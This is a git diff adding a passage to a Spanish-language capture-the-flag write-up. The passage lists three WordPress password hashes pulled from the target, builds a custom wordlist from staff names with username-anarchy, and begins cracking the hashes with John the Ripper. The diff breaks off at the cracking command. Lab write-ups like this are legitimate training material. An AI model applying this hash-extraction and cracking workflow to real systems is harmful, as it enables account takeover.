@@ -222,3 +222,35 @@ vamos a realizar una primera prueba para el `id=1` el cual ya sabemos que perten
 realizamos una segunda prueba para el identificador `id=2` y obtenemos efectivamente al usuario `galileo` con su `hash`
 ![[Pasted image 20240908000551.png]]
 
+finalmente obtenemos
+```python
+administrator : $P$BaH1/QwhsSo2APObvpFwQvhZi/60Aq/
+galileo : $P$Bi0Troerz3SXtQPHhRXfs3pQ2Q18Qs1
+jessica : $P$B6NUPpzHNGxY0uoKhJL5QOIEg2XAgC.
+```
+
+### Generar Wordlist
+
+Al tratar de crackear con el diccionario de `rockyou.txt` no obtendremos nada. Por lo que genere una wordlist personalizada con los nombres y apellidos que encontramos anteriormente.
+
+```c
+❯ cat list_users.txt
+Carla Sommons
+Jose Milane
+Galileo Thornecroft
+Sophia Carter
+Ethan Brooks
+Jessica Winslow
+```
+
+Para generar la wordlist podemos hacer uso de la herramienta [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
+
+```c
+❯ ./username-anarchy -i list_users.txt > userWordlist.txt
+```
+
+Una vez generada podemos crackear con `John The Ripper`
+
+
+```c
+❯ john --wordlist=userWordlist.txt users_hash.txt
